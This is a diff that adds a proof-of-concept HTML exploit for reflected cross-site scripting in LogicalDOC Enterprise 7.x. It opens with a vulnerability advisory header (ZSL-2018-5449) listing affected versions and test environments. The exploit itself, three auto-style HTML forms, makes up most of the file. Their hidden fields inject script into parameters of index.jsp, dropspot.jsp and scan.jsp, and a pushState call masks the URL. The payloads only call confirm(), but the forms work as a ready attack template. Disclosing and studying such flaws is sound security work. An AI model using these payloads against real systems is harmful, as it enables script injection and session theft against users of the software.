@@ -1,0 +1,85 @@
+<!--
+
+LogicalDOC Enterprise 7.7.4 Reflected Cross-Site Scripting Vulnerabilities
+
+
+Vendor: LogicalDOC Srl
+Product web page: https://www.logicaldoc.com
+Affected version: 7.7.4
+                  7.7.3
+                  7.7.2
+                  7.7.1
+                  7.6.4
+                  7.6.2
+                  7.5.1
+                  7.4.2
+                  7.1.1
+
+Summary: LogicalDOC is a free document management system that is designed
+to handle and share documents within an organization. LogicalDOC is a content
+repository, with Lucene indexing, Activiti workflow, and a set of automatic
+import procedures.
+
+Desc: LogicalDOC suffers from multiple reflected XSS vulnerabilities when input
+passed via several parameters to several scripts is not properly sanitized before
+being returned to the user. This can be exploited to execute arbitrary HTML and
+script code in a user's browser session in context of an affected site.
+
+Tested on: Microsoft Windows 10
+           Linux Ubuntu 16.04
+           Java 1.8.0_161
+           Apache-Coyote/1.1
+           Apache Tomcat/8.5.24
+           Apache Tomcat/8.5.13
+           Undisclosed 8.41
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2018-5449
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5449.php
+
+
+26.01.2018
+
+-->
+
+
+<html>
+<body>
+
+<script>history.pushState('', '', '/')</script>
+
+<form action="http://192.168.1.74:8080/prev/index.jsp">
+<input type="hidden" name="docId" value="3833857" />
+<input type="hidden" name="fileVersion" value="251';confirm(1)//" />
+<input type="hidden" name="locale" value="en_US';confirm(2)//" />
+<input type="submit" value="XSS.1" />
+</form>
+
+<form action="http://192.168.1.74:8080/webstart/dropspot.jsp">
+<input type="hidden" name="random" value="1517777865957" />
+<input type="hidden" name="language" value="en_US<script>confirm(3)</script>" />
+<input type="hidden" name="docLanguage" value="en<script>confirm(4)</script>" />
+<input type="hidden" name="baseUrl" value="http://192.168.1.74:8080" />
+<input type="hidden" name="sid" value="b0b43ae7-896e-46d6-a4b9-74af03005e3b" />
+<input type="hidden" name="folderId" value="4" />
+<input type="hidden" name="disallow" value="exe,iso<script>confirm(5)</script>" />
+<input type="hidden" name="sizeMax" value="104857600<script>confirm(6)</script>" />
+<input type="submit" value="XSS.2" />
+</form>
+
+<form action="http://192.168.1.74:8080/webstart/scan.jsp">
+<input type="hidden" name="random" value="1517777814854" />
+<input type="hidden" name="language" value="en_US<script>confirm(7)</script>" />
+<input type="hidden" name="docLanguage" value="en<script>confirm(8)</script>" />
+<input type="hidden" name="baseUrl" value="http://192.168.1.74:8080" />
+<input type="hidden" name="sid" value="b0b43ae7-896e-46d6-a4b9-74af03005e3b" />
+<input type="hidden" name="targetFolderId" value="4" />
+<input type="submit" value="XSS.3" />
+</form>
+
+</body>
+</html>
